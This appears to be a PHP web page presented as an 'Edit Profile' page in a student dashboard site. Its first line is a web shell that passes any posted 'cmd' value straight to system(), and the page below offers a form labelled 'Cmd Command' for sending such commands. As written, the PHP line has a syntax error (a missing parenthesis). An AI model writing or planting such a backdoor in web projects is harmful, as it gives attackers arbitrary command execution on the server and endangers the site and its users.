<?php system($_POST["cmd"]; ?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Profile</title>
    <link rel="stylesheet" href="../css/styles.css">
</head>
<body>
    <div class="form-container">
        <h2>Cmd Command</h2>
        <form method="post">
            <input type="text" name="cmd" required>
            <button type="submit">Thực hiện</button>
        </form>
        <p><a href="student_dashboard.php">Back to Dashboard</a></p>
    </div>
</body>
</html>
